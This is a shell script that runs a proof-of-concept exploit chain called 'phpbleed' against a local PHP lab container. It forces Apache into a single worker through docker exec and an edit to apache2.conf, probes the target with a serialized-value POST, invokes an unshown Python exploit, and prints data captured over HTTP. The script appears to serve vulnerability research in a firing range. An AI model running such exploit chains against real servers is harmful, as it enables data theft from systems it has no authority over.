#!/bin/sh
# End-to-end PoC runner: phpbleed_8089 chain against the bleed82 lane target
# (http://127.0.0.1:8089/index.php, php 8.2.34 NTS aarch64, single prefork
# worker). Resumable: phpbleed_8089.py checkpoints every phase to
# state_8089.json; rerun without --fresh to continue from the checkpoint.
#
# Prereq (done once): the bleed82 image build dropped the 1x1x1 prefork
# block (5 workers ran); it was restored at runtime:
#   docker exec php-firing-range-bleed82-1 sh -c \
#     "printf '\nStartServers 1\nMinSpareServers 1\nMaxSpareServers 1\nServerLimit 1\nMaxRequestWorkers 1\nMaxConnectionsPerChild 0\n' >> /etc/apache2/apache2.conf && kill 1"
# Verify single worker: docker exec php-firing-range-bleed82-1 \
#   ps -eo pid,user,cmd | grep [a]pache2  # -> root parent + ONE www-data child

cd "$(dirname "$0")"

echo "[*] verifying target liveness + single-worker design..."
docker exec php-firing-range-bleed82-1 sh -c \
  'n=$(ps -eo user,cmd | grep -c "[w]ww-data.*apache2"); echo "workers=$n"' \
  || { echo "container check failed"; exit 1; }
curl -sf -m 5 -X POST --data 'cook=i:1;' \
  http://127.0.0.1:8089/index.php >/dev/null && echo "[*] target answers" \
  || echo "[!] target did not answer (worker may be down - apache respawns it)"

echo "[*] firing chain (resumable; see fires_8089.log for every shot)"
python3 -u phpbleed_8089.py "$@"

rc=$?
echo
if [ -f capture_8089.txt ]; then
    echo "=== CAPTURED OVER HTTP: $(cat capture_8089.txt) ==="
    echo "[*] evidence: evidence_8089.txt, fires_8089.log, state_8089.json"
fi
exit $rc
